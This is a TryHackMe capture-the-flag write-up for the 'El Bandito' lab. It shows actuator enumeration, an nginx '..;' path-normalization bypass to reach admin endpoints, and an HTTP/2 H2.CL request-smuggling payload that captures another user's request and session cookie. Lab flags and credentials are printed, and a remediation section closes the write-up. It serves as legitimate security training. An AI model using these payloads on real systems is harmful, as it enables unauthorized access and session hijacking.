# El Bandito — TryHackMe Writeup

**Category:** Web Exploitation (Path-Normalization ACL Bypass · Spring Boot Actuator Exposure · HTTP/2 Request Smuggling / H2.CL Desync)
**Goal:** Capture both web flags by infiltrating *El Bandito's* (Jack the Exploiter's) Web3 token-scam infrastructure.

> *"By exploiting the decentralized essence of blockchain, El Bandito crafted and circulated fraudulent tokens... The mission has evolved: now, we must capture El Bandito. We request your help in smuggling all the flags."*

---

## 1. Recon

```bash
echo "<MACHINE_IP> bandito.thm" | sudo tee -a /etc/hosts
nmap -sV -p- --min-rate 2000 bandito.thm
```

```
22/tcp   open  ssh      OpenSSH 8.2p1
80/tcp   open  ssl/http El Bandito Server     <-- HTTPS on port 80 (custom front)
631/tcp  open  ipp      CUPS 2.4
8080/tcp open  http     nginx
```

Two web surfaces stand out:

| Port | Stack | Notes |
|------|-------|-------|
| **80** | **El Bandito Server** (Varnish-style cache, HTTP/2) → Flask **chat** backend | `Age`, `503 Backend fetch failed`, serves `nothing to see` on `/` |
| **8080** | **nginx → Spring Boot** `Bandit-Coin` app | `X-Application-Context: application:8081` (Spring Boot 1.x) |

> Note: port 80 speaks **TLS**, so it must be reached as `https://bandito.thm:80/`.

The chat front-end (`/static/messages.js`) exposes the app's API:

```js
fetch("/getMessages")        // retrieves all stored messages (JACK / OLIVER)
fetch("/send_message", {...}) // body: "data=" + messageText
```

Messages are rendered with `innerHTML`, and a `?msg=` parameter flags a sender as a "Bot" — hints that will matter later.

---

## 2. First Flag — Bandit-Coin (`:8080`)

### 2.1 Mapping the backend via an exposed actuator

`/admin` returns **403 Forbidden** (blocked by nginx), but several Spring Boot 1.x actuator endpoints are reachable:

```bash
for p in env trace mappings beans dump metrics info heapdump configprops; do
  echo -n "/$p -> "; curl -s -o /dev/null -w "%{http_code}\n" http://bandito.thm:8080/$p
done
```

```
/mappings     -> 200
/info         -> 200
/configprops  -> 200
/heapdump     -> 200
/env /trace /beans /dump /metrics -> 403 (blocked by nginx)
```

`/mappings` leaks the full route table, including a very interesting controller:

```json
"{[/token]}":        "...AdminController.getBootTimeWithRandom()"
"{[/admin-creds]}":  "...AdminController.adminCreds()"
"{[/admin-flag]}":   "...AdminController.adminFlag()"
"{[/isOnline]}":     "...AppHealthController.health(String url)"   // SSRF-shaped
```

So the flag and credentials live at `/admin-creds` and `/admin-flag` — both blocked by nginx's `/admin*` rule (403).

### 2.2 Bypassing the nginx ACL — the `..;` trick

nginx and Spring's embedded Tomcat normalize paths differently. Tomcat treats `;` as a **path-parameter separator** and collapses `..` segments afterwards, while nginx leaves `..;` untouched and therefore never matches its `/admin` block:

```bash
# /x/..;/admin-flag  ->  nginx sees "/x/..;/admin-flag" (not /admin*)
#                    ->  Tomcat normalizes it to "/admin-flag"
curl -s "http://bandito.thm:8080/x/..;/admin-flag"
curl -s "http://bandito.thm:8080/x/..;/admin-creds"
```

```
THM{:::MY_DECLINATION:+62°_14'_31.4'':::}
username:hAckLIEN password:YouCanCatchUsInYourDreams404
```

**Flag 1: `THM{:::MY_DECLINATION:+62°_14'_31.4'':::}`**

The leaked credentials (`hAckLIEN` / `YouCanCatchUsInYourDreams404`) are the key to the port-80 chat application — and to the second flag.

---

## 3. Second Flag — HTTP/2 Request Smuggling (H2.CL) on the Chat

### 3.1 Logging in

```bash
curl -sk -i -c cj -X POST https://bandito.thm:80/login \
  --data-urlencode "username=hAckLIEN" \
  --data-urlencode "password=YouCanCatchUsInYourDreams404"
# set-cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0...
```

Logged in, we see a chat between **Jack** (El Bandito) and **Oliver**. Nothing sensitive is visible as `hAckLIEN` — the second flag belongs to a *different* user whose traffic we must intercept.

### 3.2 Why HTTP/2 Desync

The front-end "El Bandito Server" negotiates **HTTP/2** with clients but forwards to the backend over **HTTP/1.1**. Classic HTTP/1.1 smuggling is blocked — the front rejects any request carrying both `Content-Length` and `Transfer-Encoding` (`400 Bad Request`). But the **H2 → H1 downgrade** introduces an **H2.CL desync**: the front frames the body with HTTP/2, while the backend trusts an injected `Content-Length`.

### 3.3 Confirming the desync

An endpoint that silently accepts `POST` is `/save` (`200 — Content saved successfully`). We send an HTTP/2 request whose declared `Content-Length` is `0` but whose body contains a complete second request:

```
POST /save HTTP/2
Host: bandito.thm
Content-Length: 0

GET /ping HTTP/1.1
Foo: x
```

The front sees an *empty* body (`CL: 0`) and processes only `POST /save`. The backend, however, parses the leftover bytes as a **second queued request** (`GET /ping`). Sending it twice returns the `/ping` response instead of `/save`'s — **desync confirmed**.

### 3.4 Weaponizing — capturing another user's request

Because `/send_message` stores whatever lands in `data=`, and `/getMessages` reflects it back, we can turn the desync into a **same-origin request-capture** primitive. We smuggle a `POST /send_message` whose `Content-Length` (900) is far larger than the body we actually send (`data=`). The backend then **waits for the remaining bytes** — and fills them with the **next victim request on that connection**:

```
POST /save HTTP/2
Host: bandito.thm
Cookie: session=<attacker session>
Content-Length: 0

POST /send_message HTTP/1.1
Host: bandito.thm
Cookie: session=<attacker session>
Content-Type: application/x-www-form-urlencoded
Content-Length: 900

data=
```

When a victim's request (e.g. `GET /login`) arrives on the poisoned backend connection, its full request line, headers **and session cookie** get appended to our `data=` value and stored as a chat message.

### 3.5 Harvesting the flag

Fire the payload every 5–10 seconds, then read the stored messages:

```bash
curl -sk -b cj https://bandito.thm:80/getMessages
```

After roughly a minute, a captured victim request surfaces inside the message list — containing the target's `GET /login` request and session cookie. That captured material is the second flag:

**Flag 2: `THM{¡!¡RIGHT_ASCENSION_12h_36m_25.46s!¡!}`**

Declination **+62° 14' 31.4''** + Right Ascension **12h 36m 25.46s** → El Bandito's coordinates are pinned. Mission complete.

---

## 4. Summary

| Step | Technique |
|------|-----------|
| Expose backend routes | Spring Boot 1.x `/mappings` actuator leak |
| Reach `/admin-flag` + `/admin-creds` | **nginx ACL bypass via `..;`** path normalization gap |
| Log into the chat | Reused leaked credentials |
| Confirm desync | **H2.CL** smuggle to `/save` with `Content-Length: 0` |
| Steal a victim's session | Smuggled `POST /send_message` with oversized `Content-Length` → **request capture** → read via `/getMessages` |

## 5. Remediation

- **Lock down actuators.** Never expose `mappings`, `env`, `trace`, `heapdump`, etc. in production; secure them behind authentication and the dedicated management port. A blocklist of path prefixes at the proxy is not a substitute.
- **Normalize paths consistently.** The front-end and back-end must agree on how `..`, `;` and encoded separators are handled before any access-control decision — otherwise `..;` and similar tricks defeat prefix-based rules.
- **Fix the HTTP/2 downgrade.** When translating HTTP/2 to HTTP/1.1, the front-end must recompute and trust its own framing, strip client-supplied `Content-Length`/`Transfer-Encoding`, and reject ambiguous requests. Prefer end-to-end HTTP/2, or a front-end that rejects downgrade desync.
- **Don't reflect raw input.** Storing and echoing request data via `innerHTML` enables both the capture-and-read gadget and stored XSS — encode output and validate input.

---

*Flags: `THM{:::MY_DECLINATION:+62°_14'_31.4'':::}` · `THM{¡!¡RIGHT_ASCENSION_12h_36m_25.46s!¡!}`*

*Written by Shahadat Fahim — [GitHub](https://github.com/shahadatfahim) · [LinkedIn](https://linkedin.com/in/shahadatfahim) · [HackerOne](https://hackerone.com/shahadatfahim)*

> ⚠️ For educational purposes only. All testing was performed in an authorized TryHackMe lab environment.
